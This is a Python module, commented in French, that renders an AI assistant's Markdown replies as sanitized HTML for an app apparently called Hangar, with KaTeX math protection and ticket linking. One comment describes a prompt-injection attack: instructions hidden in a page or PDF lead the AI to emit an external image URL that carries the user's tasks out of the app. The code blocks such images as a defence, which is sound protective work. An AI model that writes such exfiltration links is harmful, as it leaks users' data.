"""Rendu des réponses de l'IA : Markdown -> HTML nettoyé (nh3), formules LaTeX laissées intactes pour KaTeX,
clés de tickets (EAE-12) et @mentions changées en liens comme ailleurs dans Hangar."""
from __future__ import annotations

import re
import secrets

import markdown as md
import nh3
from markupsafe import Markup, escape

from ..securite import ExternalImages, media_filter

_CODE_RE = re.compile(r"(```.*?(?:```|$)|`[^`\n]+`)", re.S)
_MATH_RE = re.compile(r"(\$\$.+?\$\$|\\\[.+?\\\]|\\\(.+?\\\)|(?<![\\$\w])\$(?!\s)[^$\n]+?(?<!\s)\$(?![\w$]))", re.S)


def render(text: str | None) -> Markup:
    if not text:
        return Markup("")
    from ..utils import ALLOWED_ATTRS, ALLOWED_TAGS

    try:
        from ..utils import _link_refs
        src = _link_refs(text)
    except Exception:  # noqa: BLE001 - hors contexte d'application
        src = text
    token = "aimath" + secrets.token_hex(4)
    maths: list[str] = []

    def protect(m):
        maths.append(m.group(0))
        return f"{token}x{len(maths) - 1}x"

    parts = _CODE_RE.split(src)
    for i in range(0, len(parts), 2):
        parts[i] = _MATH_RE.sub(protect, parts[i])
    html = md.markdown("".join(parts), extensions=["extra", "sane_lists", "nl2br", ExternalImages()],
                       output_format="html")
    html = re.sub(r"<li>\s*\[ \]\s*", '<li class="task"><input type="checkbox" disabled> ', html)
    html = re.sub(r"<li>\s*\[[xX]\]\s*", '<li class="task done"><input type="checkbox" checked disabled> ', html)
    attrs = {k: set(v) for k, v in ALLOWED_ATTRS.items()}
    attrs.setdefault("pre", set())
    # Aucune image externe : une consigne glissée dans une page ou un PDF pourrait faire écrire à l'IA
    # ![ok](https://site/?d=<tes tâches>), que le navigateur chargerait sans clic (fuite de données).
    clean = nh3.clean(html, tags=set(ALLOWED_TAGS) | {"pre"}, attributes=attrs, attribute_filter=media_filter,
                      url_schemes={"http", "https", "mailto"}, link_rel="noopener noreferrer")
    clean = re.sub(rf"{token}x(\d+)x", lambda m: str(escape(maths[int(m.group(1))])), clean)
    return Markup(clean)


def plain(text: str | None, length: int = 140) -> str:
    t = re.sub(r"[#*_`>\[\]|]+", " ", text or "")
    t = re.sub(r"\s+", " ", t).strip()
    return t[:length] + ("…" if len(t) > length else "")
